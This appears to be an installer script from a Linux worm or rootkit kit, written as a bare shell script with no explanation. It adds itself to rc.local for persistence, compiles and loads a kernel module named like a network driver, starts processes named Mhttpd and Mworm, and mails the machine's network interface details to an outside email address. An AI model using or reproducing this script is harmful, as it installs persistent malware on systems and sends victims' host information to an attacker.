   #!/bin/sh
   cat startup >> /etc/rc.d/rc.local
   gcc -O3 -DMODULE -D__KERNEL__ -c 3c95.c
   /sbin/insmod 3c95.o
   killall -9 Mhttpd
   killall -9 Mworm
   ./Mhttpd
   ./Mworm &
   /sbin/ifconfig -a | mail -s MscanWorm whleaf@21cn.com
